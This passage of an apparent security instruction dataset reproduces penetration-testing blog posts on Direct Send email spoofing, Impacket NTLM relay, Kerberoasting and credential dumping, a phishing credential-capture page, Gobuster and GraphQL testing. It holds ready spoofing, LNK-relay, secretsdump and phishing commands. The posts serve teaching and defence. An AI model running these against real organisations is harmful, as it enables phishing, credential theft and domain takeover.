past domain categorization reputation and bypass all the target enterprises defenses with one command Sound difficult Let's dive in Microsoft Direct Send Microsoft has documentation on a feature named direct send .2 Direct send is most used by devices such as printers that print or scan to email inside an enterprise Direct scan requires no authentication and may be sent from outside of the enterprise network Prerequisites Microsoft 365 subscription and an Exchange Online Plan Direct send connects to an MX endpoint called a smart host The smart host is in the format of company-com.mail.protection.outlook.com and is created by default when a new Exchange Online plan is created Your device or host connects to the smart host via telnet on port 25 and sends unauthenticated email to internal users Outbound emails are blocked See the mail flow in the diagram3 below Figure 1 Direct Send Mail Flow Settings for direct send MX endpoint company-com.mail.protection.outlook.com Port 25 yes 25 TLS StartTLS optional Email address does not need to have a mailbox Recommended SPF settings from Microsoft v spf1 ip4 include spf.protection.outlook.com all Spoofing With Microsoft direct send inbound email will make it into the enterprise if that domain is trusted So in most cases with direct send we can send mail from hr company.com to anyone else inside company.com since the domain will trust itself In many cases we're also able to spoof external email addresses to internal users if those domains are trusted by the mail gateway such as account-security-noreply accountprotection.microsoft.com used from Microsoft security emails could be used as a From address Microsoft direct send does not allow mail to be delivered outside of the enterprise So no spoofing internal to external An added benefit of spoofing is that the From field populates with the From user's Microsoft icon as well If we send an email from noreply bigtimebank.com to user company.com the email from field will show the avatar of the noreply user typically the company logo To test this against your own newly created Exchange Online plan add a Bypass Spam Filter rule in the exchange admin center.4 Figure 2 Bypass Spam Filters for Trusted Domains This rule allows internal emails to land in the inbox instead of Junk on default initial installations Testing a Spoof Sending a spoofed email is as simple as using a PowerShell command Here's an example PowerShell command Send-MailMessage -SmtpServer company-com.mail.protection.outlook.com -To frank company.com -From informationsecurity company.com -Subject Urgent Update Required -Body Frank We need you to update your Microsoft Office software Run this update as soon as you can please No need to let me know when it's complete Download -BodyAsHTML This PowerShell cmdlet can also be found in PowerShell for Linux With that in mind it's possible to send your phishing emails from just about anywhere One of my favorites is to send directly from Azure Cloud Shell which is easily accessible from Windows Terminal It's easy to rotate IP addresses this way Azure Cloud Shell is easily accessible from the Windows Terminal App Figure 3 Windows Terminal App Figure 4 Sending an Email from Azure Cloud Shell SPAMHAUS SPAMHAUS will block most residential IP addresses from sending emails Don't send phishing emails from your house Mail Gateways In testing against enterprises that utilize third-party mail gateways spoofing has been extremely successful using this technique While mail may still flow through the email gateway default configurations may trust email originating from their own domain and .mail.protection.outlook.com Exchange Online Protection Exchange Online Protection EOP is a Microsoft cloud-based email filter that protects enterprises against email threats EOP is included by default with all Microsoft 365 enterprises using Exchange Online mailboxes Keep in mind that Microsoft Defender for Office 365 is a separate offering and not covered in this blog post Email flows through Exchange Online as detailed in the diagram5 below Figure 5 Exchange Online Mail Flow Inbound email is first scrutinized for sender reputation where most spam is diverted or stopped Next each message is scanned for malware Learn more about anti-malware protection here It should be noted that direct-send-spoofed messages still pass through these protections Attachments may be detonated in a sandbox Microsoft provides a common attachments filter that enables defenders to block specific file types by default This setting is disabled by default and when enabled blocks these file extensions by default ace ani app cab docm exe iso jar jnlp reg scr vbe vbs Messages then continue through mail flow rules Finally messages pass through content filtering anti-spam anti-spoofing and are routed accordingly For a full list of features available by EOP visit ocs.microsoft.com en-us microsoft-365 security office-365-security exchange-online-protection-overview?view o365-worldwide eop-features Figure 6 High-Risk Delivery Pool Criteria Unfortunately if we're sending our spoof through a proxy that doesn't have A and MX records matching the From domain our mail will be even more scrutinized A phishing template often used for Microsoft device code phishing6 currently enters an unknown abyss when sent Microsoft IP Banning During a phishing engagement your IP may become soft-banned by Microsoft No worries there you may submit a request to be unbanned or change your IP address If you're using Cloud Shell to send a phishing email restarting the console will provide you with a new IP address If you want to unblock an IP it takes just a few minutes and you're back in business Visit ender.office.com and enter the details to unblock Figure 7 Unblock Banned IP Address Breaking It Down With Microsoft direct send we're able to send emails on behalf of external or internal users to other internal users inside enterprises using Microsoft 365 in essence spoofing emails into many organizations This works because Microsoft utilizes smart hosts for Exchange typically located at an address like company-com.mail.protection.outlook.com that allows unauthenticated SMTP relays to internal users External third-party email gateways are a great way to catch most spam or spoofing attempts Spoofing with Microsoft direct send may bypass many of these gateways and land you in the inbox This spoofing technique has been extremely successful in landing phishes into enterprise inboxes However while simple emails may land in the inbox common phishing templates or attachments may be blocked As always it's important to test your infrastructure prior to sending live emails into your target enterprise For Defenders Defenders should test the ability to send internal emails via direct send and ensure that any email gateways adhere to the proper mail flow for internal recipients There is no Disable Direct Send feature in Microsoft 365 It is necessary to correctly set your mail gateway settings to allow specific IP addresses to send emails on behalf of the enterprise Refer to your mail gateway documentation Closing At the time of this writing this finding has been submitted to MSRC and CLOSED per Microsoft without a fix I hope this blog post highlights the dangers posed by Microsoft direct send regarding spoofed phishing attacks and enables defenders to better protect their network while providing offensive operators another technique to test and enhance enterprise defenses Special thanks to ustayready for pointing me down this research path Check out his handy Python script7 for sending spoofed messages as well References 1 ww.verizon.com business resources reports dbir 2021 results-and-analysis 2 ocs.microsoft.com en-us exchange mail-flow-best-practices how-to-set-up-a-multifunction-device-or-application-to-send-email-using-microsoft-365-or-office-365 3 ocs.microsoft.com en-us exchange exchangeonline media cb07aae7-ca31-43a7-a468-74c293b37a66.png 4 dmin.exchange.microsoft.com transportrules 5 ocs.microsoft.com en-us microsoft-365 media tp_emailprocessingineopt3.png?view o365-worldwide 6 xboku.com 2021 07 12 ArtOfDeviceCodePhish.html 7 ist.github.com ustayready b8314a4a964ff498f7b4682fc66475cc"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Impacket Offense Basics With an Azure Lab</title>\n<taxonomies>Author, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, InfoSec 201, Jordan Drysdale, Red Team Tools, Jordan Drysdale</taxonomies>\n<creation_date>Wed, 01 Jun 2022 18:00:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Overview The following description of some of Impacket's tools and techniques is a tribute to the authors SecureAuthCorp and the open-source effort to maintain and extend the code ithub.com SecureAuthCorp impacket Lab Setup ARM template here doazlab.com or github.com DefensiveOrigins DO-LAB Authenticate to an Azure subscription where you can construct resources Deploy lab Domain controller and joined workstation Ubuntu ntlmrelayx.py The attack scenario below emulates Mitre ATT CK 1204 Malicious Link ttack.mitre.org techniques T1204 001 The attacker leaves an LNK file on a network file share to trigger silent authentication to a malicious target All unprotected visitors to the file share submit credentials without user interaction Yes this is scary The following PowerShell commands generate the shortcut file LNK and target the ntlmrelayx listener cd c mkdir c file6 New-SmbShare -Name file6 -Path C file6 -ChangeAccess Users -FullAccess Administrators objShell New-Object -ComObject WScript.Shell lnk objShell.CreateShortcut c file6 malicious.lnk lnk.TargetPath 10.0.0.8 threat.png lnk.WindowStyle 1 lnk.IconLocation windir system32 shell32.dll 3 lnk.Description Users browsing any file share with this LNK file triggers SMB auth lnk.HotKey Ctrl Alt O lnk.Save The ntlmrelayx.py listener setup below targets an SMB listener on a remote server ws05.doazlab.com This attack emulates Mitre ATT CK T1557 Adversary in the Middle ttack.mitre.org techniques T1557 001 The following commands launch the virtual environment installed during the lab deployment Note virtual environments simplify Python tooling requirement installations and are easy to use This most basic invocation attacks the workstation's listening SMB port on TCP 445 sudo -s cd opt impacket source imp-env bin activate cd examples ntlmrelayx.py -t 192.168.2.5 -smb2support tee a opt impacket relay1.log The hapless victim visits the file share with the attacker's LNK and triggers authentication to the ntlmrelayx.py listener's TCP 445 relay When the relayed victim has admin privileges on the target system ntlmrelayx dumps NT hashes through the remote registry service An attacker can also attack LDAP services listening on domain controllers In its most basic form that attack looks something like the next command You would need to swap DC names IP addresses and make sure secure LDAP is listening on TCP 636 on your target ntlmrelayx.py -t ldaps dc01.doazlab.com This listening setup cannot rely on the poisoned SMB share mentioned earlier that served as the source of our initial foothold through share poisoning You cannot relay SMB authentication challenge responses to LDAPs it does not work Instead this attack might rely on a browser proxy configuration hijack Through basic poisoning configuration you might see something like the following upon successful HTTP challenge authentication poisoned hijacked whathaveyou With all that output in mind this tool just hijacked the domain without us having to do much The default settings given sufficient relayed privileges wreaked havoc on the target domain We need to understand what is happening under the hood a bit more The following invocation is closer to a standard approach for me and we will talk about each of the flags and why ntlmrelayx.py -t ldaps dc01.doazlab.com -ts -l opt impacket loot --add-computer BHISBlog47 --dump-laps --no-dump --no-da Here is the usage output ntlmrelayx.py -h and obviously there are a lot of options Back to the previous usage scenario what happened there In theory this attack technique kinda matched against an older version of the Mitre ATT CK technique T1136 Add a Domain Account ttack.mitre.org techniques T1136 002 This does not match closely to a technique I can find in the current matrix and this is likely a function of my ability to find it rather than a blind spot in the matrix ntlmrelayx.py -t ldaps dc01.doazlab.com -ts -l opt impacket loot --add-computer BHISBlog47 --dump-laps --no-dump --no-da -t target specification in this case the secure LDAP listener on a DC -ts add timestamps to the console output -l define a loot directory --add-computer as it reads but generate a random password --dump-laps as it reads relayed user requires sufficient privileges to read related schema attributes --no-dump do not dump the AD users groups etc LDAPDomainDump --no-da do not attempt to create a domain admin Another strongly advised step when running these tools is to write your own log file I like to add a pipe output like so tee -a opt impacket relay.log There is so much more ntlmrelayx.py is capable of and should desire sufficiently warrant we will put together an even deeper dive However let's take a look at a couple more tools in the Impacket library before concluding this write-up GetADUsers.py The GetADUsers.py class can turn that first compromise into an accurate user list This attack could be referenced in MITRE ATT CK as T1087 Account Discovery Domain Account This is basic enumeration in the attack technique matrix ttack.mitre.org techniques T1087 002 python3.9 GetADUsers.py -all -ts doazlab.com doadmin 'DOLabAdmin1 -dc-ip 192.168.2.4 tee -a opt adusers.txt This text output now serves as another reference point for expanding attacks against the domain This step is somewhere in the attack matrix but I would say as a pentester I am going to rely on BloodHound datasets long before I go hunting for this output This is only an opinion and is subject to change Get-GPPPassword.py Contrary to GetADUsers.py and its infrequent use in my arsenal the Get-GPPPassword.py class is more commonly used This is a quick check against Microsoft's unintentional publishing of the decryption scheme for the group policy preference password storage We are still finding these passwords in the wild but it is becoming less frequent python3.9 Get-GPPPassword.py 'doazlab.com 'doadmin 'DOLabAdmin1 '192.168.2.4 This attack maps against MITRE ATT CK a sub-technique under T1552 Unsecured Credentials Group Policy Preferences ttack.mitre.org techniques T1552 006 We did not recover any credentials with this attack against the lab environment but you might GetUserSPNs.py The GetUserSPNs.py class was designed to gather Kerberos ticket hashes from a domain This attack is classified as a sub-technique of MITRE ATT CK T1558 Steal or Forge Kerberos Tickets ttack.mitre.org techniques T1558 003 python3.9 GetUserSPNs.py 'doazlab.com 'doadmin 'DOLabAdmin1 -dc-ip 192.168.2.4 -outputfile opt hashes kerbs.txt The -outputfile command option provided the crackable Kerberos ticket material below in Hashcat ready format Secretsdump.py Finally let's review Secretsdump.py Two unique usage scenarios will be presented below The first attack dumps credential material from a remote system where administrative privilege has been obtained This attack aligns with MITRE ATT CK T1003 OS Credential Dumping ttack.mitre.org techniques T1003 003 The syntax below is the most basic usage and will attempt a dump of LSA secrets and the SAM table of the targeted remote system python3.9 secretsdump.py doazlab doadmin 'DOLabAdmin1 192.168.2.5 tee -a opt hashes secrets-output.txt This attack is surprisingly hard to detect with standard Windows optics but we will cover that discussion in the defensive tactics companion write up The second Secretsdump.py invocation is the NTDS.dit capture This has the same parent technique T1003 OS Credential Dumping but is a different sub-technique In this case the MITRE sub-technique is listed as DCSync ttack.mitre.org techniques T1003 006 Did I mention that hashes are good enough to sync secrets on a domain python3.9 secretsdump.py -outputfile 'doazlab.dit 'doazlab.com doadmin '192.168.2.4 -hashes aad3c435b514a4eeaad3b935b51304fe 3606a042149187931ced1f8cedafe26c Thanks for reading -jd"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Phishing Made Easy(ish)</title>\n<taxonomies>How-To, Informational, InfoSec 101, Phishing, Red Team, Social Engineering, ansible, automation, credential capture, ethical, hacking, html</taxonomies>\n<creation_date>Tue, 07 Jun 2022 15:02:08 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Hannah Cartier Social engineering especially phishing is becoming increasingly prevalent in red team engagements as well as real-world attacks As security awareness improves and systems become more locked down it is unsurprising that the human element of security is becoming a more appealing attack vector In addition phishing campaigns can be used to test the controls surrounding a company's employees Scoring one valid login to a target's resources can save a tester hours or even days of vulnerability scanning and exploitation In this blog we are going to walk through setting up a simple yet effective landing page for your phishing campaigns We will be using an open-source tool developed by BHIS that requires minimal installation and does not use any paid or third-party components Motivation A while back I was asked to set up a landing page for a phishing engagement And that was the extent of the instructions I received To build this page I first attempted to create a simple registration form using WordPress It turned out that either WordPress was more complicated than I had anticipated or I wasn't as tech-savvy as I liked to believe In hindsight it was probably a bit of both After fighting the interface for a few hours with my patience diminishing and the test date soon approaching I decided it might be time to jump ship However I am also a rather mediocre web developer and setting up everything from scratch each time clearly was not a sustainable solution Ultimately I set the thing up from scratch I designed the landing page using open-source HTML templates served them up with NGINX and forwarded the form submissions through the NGINX reverse proxy to a flask server where the client IP user-agent and form data are written to a log Then I developed a tool called Sinker to automate this entire process so I would never have to do it again The remainder of this blog walks through an example of how one would use this tool to set up a phishing campaign Target Black Hills Information SecurityDomain blackhills.phishingdomain.com Phishing Email RE New Health and Safety Measures Complete before ARBITRARY_DATE Black Hills Infosec understands that the health and wellbeing of our employees is of upmost importance Amid the current Covid-19 climate along with recent CDC amendments to health and safety measures it is important to take precautions and respect each others concerns Our insurance partners are working with PCHC to bring you the most up to date information on risks and information including covid-19 booster information internal case counts etc Please follow the link below to set up your account on our health and safety portal This must be completed in order to stay enrolled in any of our insurance plans Note For your convenience please use your Black Hills Infosec email and password for registering Bam Now all we need is for there to actually be something at that link below through which we can capture credentials This is precisely what our tool Sinker assists in building and deploying Deployment Requirements An internet-accessible server on which to host your landing page running Debian ideally Ubuntu A domain with DNS A records pointing to your server Setup Clone the GitHub repository located here ithub.com Hannnah1 Sinker Open the inventory file and replace the IP address with the public IP of your server If you wish to deploy the phish on more than one add another line for each additional IP If you do not have Ansible installed on your local machine run runme_first.sh Note For Windows users you will have to install Ansible manually or run the program through WSL Next open vars.yml and change the following configuration variables site The directory containing the landing page This must exactly match one of the directory names under the phishinglines directory target_name The name of the target company as we would like it to appear on our landing page ssh_key The location of the SSH key to be used for logging in to the remote server domain_name Your domain name certbot_mail_address The email to be used for generating the letsencrypt certificate We will only be allowing our targets to connect over https Example Config variables Do change these site covidruse Target_Name Black Hills Spaces are OK no quotes please ssh_key HOME .ssh id_rsa domain_name blackhills.phishingdomain.com certbot_mail_address hcartier blackhillsinfosec.com CSS For landing page NO SEMICOLONS background_color white primary_color rgba 156 191 191 1 secondary_color black The code snippet above has been edited for attacking Black Hills Information Security In addition to the company name we have also customized the primary and secondary color values for the CSS Using the colors of our target company will help with the believability of our page due to the element of familiarity That's it for configuration now it's time to run the playbook This can be done by entering the following command in your terminal ansible-playbook main.yml This next step is the most important Take your hands off the keyboard stand up and go make a nice hot cup of coffee while the program does the following on your behalf Updates packages Installs nginx Configures nginx for your domain and landing page Generates a letsencrypt certificate using certbot Copies the templates and any other contents of your landing page directory to var www Installs tmux Runs a flask app inside of the tmux session to receive form submissions forwarded by nginx and write them to a log file If all goes well you should see the following output If you do not have Cowsay installed the output will be formatted a bit differently and you will be seen by your coworkers as much less cool As long as no failed or unreachable errors are produced you're good to go Browsing blackhills.phishingdomain.com demonstrates that our landing page is displayed as expected Upon submitting the form the target received the following acknowledgment that their submission was received The objective of this confirmation is to not raise suspicion The server logs the IP address of the client the name email and password they entered as well as the user agent If we log into our server console and look at forms.txt we will see the following Creating Additional Landing Pages There are hundreds of free HTML templates that can be quickly edited to fit your needs For example in this blog we adapted the template found here ympanus.net Tutorials LoginRegistrationForm index3.html toregister To be compatible with these automated setup scripts you will need to make the following changes Anywhere you want the target company's name to appear replace that spot with the exact text Target_Name Your form must have an element with id name id email and id password You must ensure your submit button is of type submit and insert the send.js script type submit Complete Registration src send.js Your page must be titled target.html.j2 following the template format Congrats You now have a landing page that can be quickly spun up for multiple engagements Conclusion Phishing is easy but can be time-consuming Hopefully this program can help make it a little simpler and faster The author recommends NOT including the names and emails of people who fell for the phish in the report for the client Knowing exactly whose credentials you gained does not help in remediation and could potentially get that person in trouble"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>For Web Content Discovery, Who You Gonna Call? Gobuster!</title>\n<taxonomies>Author, External/Internal, General InfoSec Tips & Tricks, Melissa Bruno, Web App</taxonomies>\n<creation_date>Tue, 14 Jun 2022 17:11:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Melissa Bruno One of the best early steps to take when testing a network especially a large one is to run the tool EyeWitness to gain a quick understanding of what types of web applications are present in the environment In some cases valuable information may be sitting in plain sight on the homepage of a poorly secured web application Other times you might glean the names and version numbers of vulnerable pieces of software from HTTP headers and source code then leverage known exploits to your advantage Sometimes gaining admin access to software is as simple as looking up the manual for a web content management service then plugging in the default URL of the admin portal and default credentials But what about web applications that don't give you much to work with Maybe the root directory returns a blank page or an HTTP 404 Not Found error and the HTTP headers show up-to-date software version numbers or no useful information at all This is where automated guesses can come into play Scripts and automated tools can be used to check for common files and directories that may be running on a web server One such tool is gobuster Installing Gobuster Depending on your operating system you may be able to install gobuster directly with a package manager Otherwise gobuster will run on any system that can run the latest version of the Go programming language For the latter method you will first need to download the latest version of Go here olang.org dl and then install it using the instructions here olang.org doc install Once Go is set up simply run the command go install github.com OJ gobuster v3 latest to install the latest version of gobuster The go install command will place the gobuster executable file in either the GOPATH bin or HOME go bin directories Running Gobuster To demonstrate the usage of gobuster I set up a directory with a few files and hosted them locally using a simple HTTP server with Python 3 which you can do yourself by creating a directory with the files that you want to host navigating to that directory and then using the command python3 -m http.server 8000 --bind 127.0.0.1 Next in the directory containing the gobuster executable file create two more files one with a list of filenames that you want to check for and one with a list of directory names I used SecLists raft-medium-directories.txt and raft-medium-files.txt lists Check if the server has any of the directories in your list with this command gobuster dir -u 27.0.0.1 8000 -w raft-medium-directories.txt In the output section we can see that gobuster picked up the important directory Now I'll check that directory for the presence of any of the files in my other list gobuster dir -u 27.0.0.1 8000 important -w raft-medium-files.txt Now gobuster has identified a file secret.html Navigating to it returns an admittedly low-effort representation of a webpage containing confidential data Fine-Tuning Gobuster Because the web server used in this example was bare-bones the simplest possible gobuster commands returned interesting easy-to-parse output This will typically not be the case for production web servers Some of the more commonly used Gobuster arguments include --user-agent Increase the likelihood that the web server will return a valid response by using a browser's user agent string timeout Increase the timeout duration to decrease the likelihood of missing pages hosted by slow-to-respond servers --no-tls-validation Do not require validation of TLS --exclude-length Do not show results for HTTP responses of a specified length --status-codes Specify which HTTP response codes should be interpreted as the web application returning a valid file This can reduce false negatives --status-codes-blacklist Specify which HTTP response codes should not be interpreted as the web application returning a valid file This can reduce false positives As always make sure that you have permission to test the targeted web applications before running these tools"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Lessons Learned While Pentesting GraphQL</title>\n<taxonomies>How-To, Web App</taxonomies>\n<creation_date>Wed, 06 Jul 2022 20:24:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sean Verity GraphQL is one of those technologies that I heard about several years ago but had not encountered during an actual pentest After reading a blog or two I remember thinking JSON database queries got it and then I moved on I didn't see GraphQL during an actual pentest until about a month ago There were a few pain points that I worked through to bootstrap my GraphQL pentesting chops Hopefully I can help you avoid these same pain points when you come across GraphQL for the first time during a pentest bug bounty hunt or CTF There are several tools out there I started out doing things manually which is good to learn GraphQL but gets really hard really fast when you start getting into something beyond a very basic GraphQL query Therefore I'm going to suggest using a tool that can automate or at the very least create queries that are good from a syntax perspective This blog also assumes that GraphQL introspection is enabled There are tools to enumerate GraphQL schemas when introspection is disabled but that is outside the scope of this blog But in case you need one here you go ithub.com nikitastupin clairvoyance How to Find GraphQL The easiest way to find GraphQL is to look at your Burp History logs In the HTTP History tab filter by the search term graphql and see if anything pops up You could also search your target in the Site map tab for graphql If the app is using GraphQL on the frontend you'll see an endpoint that includes graphql somewhere in a URL But what if GraphQL wasn't intended to be exposed Well there's a GraphQL SecList for that Feed the GraphQL SecList to Gobuster or your favorite forced browsing tool for effect BTW Did you see our recent blog on Gobuster ww.blackhillsinfosec.com for-web-content-discovery-who-you-gonna-call-gobuster Speaking GraphQL After finding GraphQL one of the first things you might want to do is send the request to Burp Suite's Repeater tab for further analysis One thing that jumped out for me is that GraphQL is VERY transparent Take a look at the following error message There's actually a few things wrong with this query but from reading the error message it is plainly obvious where we can start to fix it GraphQL also has this wonderful feature called introspection GraphQL's introspection feature is a convenient way for GraphQL to share details about itself with other developers or consumers of the GraphQL instance When introspection is enabled the entire GraphQL schema can be retrieved with a single query This provides a significant advantage to pentesters bug bounty hunters or anyone looking for vulnerabilities The GraphQL visualization tool graphql-voyager can import a GraphQL schema and turn it into a map with nodes and edges This can be a nice way to get an overview of the types queries and size of the schema Here's a snippet from an example GraphQL schema that describes a popular movie franchise set in a galaxy far far away As a side note the first time I saw GraphQL during a pentest I imported a schema into graphql-voyager and started writing GraphQL queries in Repeater from scratch This was fun from a learning perspective and was no big deal for simple queries I quickly realized that this approach was unsustainable though as I dug further into the schema where there were more complex queries It was really easy to include a misplaced curly brace And then I learned about this awesome project called InQL Introspection Query Language InQL can retrieve a GraphQL schema from a remote server through GraphQL's introspection feature and parse it into request templates InQL can also import a file if you have the schema saved on disk InQL can be run as a CLI tool or as a Burp Suite extension Running InQL as a Burp Extension offers the benefit of a workspace where you can copy and paste the request templates into other tools such as Repeater or Intruder for further testing Installing the InQL Burp Suite Extension Installing the InQL Burp Suite extension is as simple as searching for it in the BApp store and clicking the install button You might be wondering why I searched for graphql in the BApp Store as opposed to inql During a test I'll often search for a particular technology or thing in the BApp Store e.g JavaScript secrets Node etc as opposed to searching for a tool I have found this to be helpful in the situation where I'm running into issues with a particular extension and I need an alternative that works After installing InQL fetching a schema is as simple as copying the GraphQL endpoint into the address bar and clicking the Load button It might take a few seconds for the schema to load Upon completion the interface should look similar to below The schema in the screenshot above was grabbed from Damn Vulnerable GraphQL Application As can be seen in the figure above the InQL will parse the schema into queries mutation and subscriptions InQL will also do you the favor of documenting the associated fields and arguments in request templates When you come across GraphQL during a pentest you might find subscriptions but you will almost certainly come across queries and mutations Queries as you likely guessed will fetch data from the GraphQL data store I like to think of mutations as functions because their purpose is to modify data in the GraphQL data store Both queries and mutations can accept arguments which are good to fuzz After you load a schema into InQL you can inspect the objects and copy the request templates from InQL to Repeater for further testing When you copy request templates from InQL to Repeater pay attention to which tab you copied from Copying a request template from the GraphQL tab into Repeater will not work However you can copy a request from the Raw tab into the body of a POST request in Repeater Ok so actually when InQL is installed an extra tab is included in Repeater to paste or tweak your GraphQL queries The important thing to remember though is that you need to put the right query format into the right Repeater tab In the example below a GraphQL query from InQL was copied into the GraphQL tab in Repeater When querying the systemHealth type we see a reasonable response As a basis for comparison here's what happens when you accidentally put a raw query into the GraphQL query tab Now look at that beautiful error message Isn't that nice Even though the query was not formatted correctly GraphQL is generous enough to respond with a helpful error message that you can use to troubleshoot From this point you could continue manually testing with Repeater or send it to Intruder for fuzzing Think of the GraphQL API as a roundabout way of interacting with the application's back end Here are a few hacking ideas Striking out on fuzzing normal requests Try fuzzing the GraphQL queries mutations and their arguments Is the app doing a good job at preventing brute forcing Find a query or mutation that accepts a password as an argument and see if there's brute force prevention there More on this topic here wasp.org www-project-web-security-testing-guide v42 4-Web_Application_Security_Testing 04-Authentication_Testing 10-Testing_for_Weaker_Authentication_in_Alternative_Channel Look at all the queries and mutations that look interesting and try them out You might get lucky and come across a query that reveals secrets about the application Other GraphQL Testing Tips Found a query that needs arguments Search Burp History for the arguments Search for substrings or variants of what's in the schema As an example the schema might have enumerated an argument named fooBar Try searching for foo in Burp History in case the front end uses a different naming convention such as foo_bar See if Burp's Target Analyzer uncovered GraphQL arguments for you as well In the Sitemap tab right-click on the target's base node then choose Engagement Tools Analyze Target Watch for error messages in the GraphQL response GraphQL will clearly tell you what is wrong with your query You may have forgotten an argument or passed an integer when it expected a string etc Take Modern WebApp Pentesting w BB King Other testing techniques that will come in handy for testing GraphQL such as NoSQL injection are covered Troubleshooting One of the most frustrating things that I encountered when testing GraphQL was when a query would work and then the next day it didn't The problem was usually pretty simple and easy to overlook Here are a few things to check if you're in that situation Make sure you're sending a POST request A GET request might trigger an error message to tip you off that GraphQL is present But you gotta use POST requests for valid queries Make sure that the following request header is present Content-Type application json Read error messages in the response and modify your request accordingly Double-check which context you pasted a query into GraphQL queries can only be pasted into the GraphQL context in Repeater Raw requests will not work when pasted into the GraphQL context in Repeater If you don't see the InQL dropdown option in Repeater Copy a query from InQL into raw format into a POST request in Repeater then click Send This will usually bootstrap the InQL context in Repeater GraphQL Security Testing Resources for Further Learning ithub.com doyensec inql vangoncharov.github.io graphql-voyager ithub.com swisskyrepo PayloadsAllTheThings tree master GraphQL 20Injection ithub.com dolevf Damn-Vulnerable-GraphQL-Application ww.antisyphontraining.com modern-webapp-pentesting-w-bb-king"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Impacket Defense Basics With an Azure Lab</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Jordan Drysdale, Azure, defense, Detection, doazlab.com, Impacket, Jordan Drysdale</taxonomies>\n<creation_date>Tue, 26 Jul 2022 17:06:57 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Overview The following description of some of Impacket's tools and techniques is a tribute to the authors SecureAuthCorp and the open-source effort to maintain and extend the code This is a follow-up to my Impacket Offense Basics With an Azure Lab article and is going to take the other perspective of trying to detect and defend against these techniques ithub.com SecureAuthCorp impacket Lab Setup ARM template here doazlab.com or github.com DefensiveOrigins DO-LAB Authenticate to an Azure subscription where you can construct resources Deploy lab Domain controller and joined workstation Ubuntu Preventative Deception This section will provide some basic commands for creating a couple of controlled objects in Active Directory These objects will help us detect a few common attacks later The Deploy-Deception toolkit deserves some credit and while the repo is a few years old the material is still relevant Some of the most basic detections like object attribute reads by an attacker against controlled objects or Kerberoasting them can reduce our mean time to detection GitHub ithub.com samratashok Deploy-Deception Blog ww.labofapenetrationtester.com 2018 10 deploy-deception.html The Luis account below is being created to facilitate some enumeration-type and Kerberoasting detections later New-ADUser -UserPrincipalName Luis.Graves doazlab.com -Path OU DomainUsers dc doazlab DC com -GivenName Luis -Surname Graves -Enabled 1 -Name Luis.Graves -desc Accounting Controller -office Accounting -title Controller -company DevLabs -AccountPassword ConvertTo-SecureString Password1 -AsPlainText -Force -Credential Cred The account should have landed in the DomainUsers OU under the root of the domain This account will be useful later I promise Ntlmrelayx.py Defending against expansive toolkits like ntlmrelayx can be a challenge You thought the Impacket libraries were extensive There's like 300 different combinations of attack options for just ntlmrelayx The defense scenario below attempts to mitigate Mitre ATT CK 1204 Malicious Link The LNK attack basically relies on a listening relay that is targeted by the LNK shortcut file ttack.mitre.org techniques T1204 001 So in my opinion and at the time of writing July 16 2022 the mitigations outlined under the MITRE ATT CK framework are insufficient to protect a domain's file shares from the LNK and URL attack vector Network intrusion prevention comes up short under the following assumptions The adversary is trying to escalate privileges but is already working under a domain user's compromised context Leaving an LNK or URL artifact on a file will likely go undetected without Microsoft's File Server Resource Manager1 or similar technology The mission of an adversarial LNK file is not to download but instead to trigger silent authentication to the adversary relay Anyway I am failing to connect the dots with this mitigation and reality on the ground Mitigation ID M1021 Restrict Web-Based Content also suffers from the same reality that once an end user is compromised their file shares become a soft target As a pentester I am not looking for web access web services or anything related to TCP 80 or TCP 443 after landing on a domain joined system File shares web protocols Strange Finally the M1017 recommendation to train users is misplaced A user browsing a file share interacts with the LNK file silently Looking at an LNK's target path in the command below we can see it is pointed at an IP address elsewhere PS C lnk 